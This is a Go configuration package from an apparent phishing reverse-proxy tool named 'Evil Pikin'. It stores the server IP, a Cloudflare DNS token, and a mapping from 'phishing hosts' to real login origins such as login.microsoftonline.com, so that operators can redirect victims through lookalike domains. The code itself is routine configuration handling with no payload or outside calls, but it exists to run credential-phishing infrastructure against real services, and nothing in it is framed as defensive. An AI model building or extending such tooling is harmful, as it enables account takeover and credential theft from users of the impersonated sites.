// Package config holds the thread-safe runtime parameters shared between the
// control plane and the proxy/data-plane workers. Evil Pikin keeps all mutable
// deployment state here so operators can update targets, the base domain, and
// the server IP from the TUI without restarting the engine.
package config

import (
	"fmt"
	"net"
	"sync"
)

// RuntimeConfig is the single source of truth for live deployment state.
// Every field is guarded by mu; never read/write the exported fields directly.
type RuntimeConfig struct {
	mu              sync.RWMutex
	BaseDomain      string
	ServerIP        string
	CloudflareToken string
	// TargetMapping maps an incoming phishing host (e.g. "login.evilpikin.com")
	// to the real upstream origin host (e.g. "login.microsoftonline.com").
	// Values are bare hosts — no scheme, no port.
	TargetMapping map[string]string
}

// NewRuntimeConfig returns an initialized, empty configuration.
func NewRuntimeConfig() *RuntimeConfig {
	return &RuntimeConfig{TargetMapping: make(map[string]string)}
}

// SetBaseDomain sets the root tracking domain.
func (c *RuntimeConfig) SetBaseDomain(d string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.BaseDomain = d
}

// SetServerIP records the public VPS IP. It accepts IPv4 or IPv6 (net.ParseIP)
// so the tool stays dual-stack compatible and rejects malformed input.
func (c *RuntimeConfig) SetServerIP(ip string) error {
	if net.ParseIP(ip) == nil {
		return fmt.Errorf("invalid ServerIP %q (expected IPv4 or IPv6)", ip)
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	c.ServerIP = ip
	return nil
}

// SetCloudflareToken records the API token used to authenticate DNS changes.
func (c *RuntimeConfig) SetCloudflareToken(t string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.CloudflareToken = t
}

// SetTarget binds an incoming phishing host to a real upstream origin host.
func (c *RuntimeConfig) SetTarget(incomingHost, upstreamHost string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.TargetMapping == nil {
		c.TargetMapping = make(map[string]string)
	}
	c.TargetMapping[incomingHost] = upstreamHost
}

// TargetFor resolves an incoming request host to its upstream origin. It matches
// the exact host and, failing that, a host with the port stripped (the proxy
// receives "host:port" from TLS/SNI and "host" from plain HTTP).
func (c *RuntimeConfig) TargetFor(host string) (string, bool) {
	if h, _, err := net.SplitHostPort(host); err == nil {
		host = h
	}
	c.mu.RLock()
	defer c.mu.RUnlock()
	if c.TargetMapping == nil {
		return "", false
	}
	if u, ok := c.TargetMapping[host]; ok {
		return u, true
	}
	return "", false
}

// Snapshot returns a consistent copy of the configuration for display or to seed
// a background worker (e.g. the DNS synchronizer).
func (c *RuntimeConfig) Snapshot() (domain, ip, token string, mapping map[string]string) {
	c.mu.RLock()
	defer c.mu.RUnlock()
	m := make(map[string]string, len(c.TargetMapping))
	for k, v := range c.TargetMapping {
		m[k] = v
	}
	return c.BaseDomain, c.ServerIP, c.CloudflareToken, m
}
